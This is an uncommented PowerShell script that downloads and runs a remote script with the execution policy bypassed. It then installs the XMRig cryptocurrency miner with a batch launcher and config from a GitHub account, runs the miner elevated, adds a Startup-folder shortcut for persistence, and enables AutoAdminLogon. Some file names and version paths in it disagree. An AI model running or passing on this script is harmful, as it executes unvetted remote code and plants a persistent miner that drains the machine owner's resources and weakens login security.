Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1
powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1"
Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'
Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs
Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip
& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'
Start-Sleep -Seconds 3
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRPRUN.bat -OutFile C:\XRPRUN.bat
Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/config.json -OutFile C:\config.json
Copy-Item -Path C:\XRPRUN.bat -Destination C:\xmrig-6.22.2\XRPRUN.bat -Force
Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
Start-Process -FilePath 'C:\xmrig-6.22.2\XRPRUN.bat' -ArgumentList '/S' -Verb RunAs
$source = "C:\xmrig-6.22.0\XRP.BAT"
$destination = "C:\Users\1111\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\XRP.BAT.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($destination)
$shortcut.TargetPath = $source
$shortcut.Save()
$ShortcutPath = "$env:USERPROFILE\Desktop\Startup Folder.lnk"
$TargetPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $TargetPath
$Shortcut.Save()
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "AutoAdminLogon" -Value "1"
powershell.exe exit
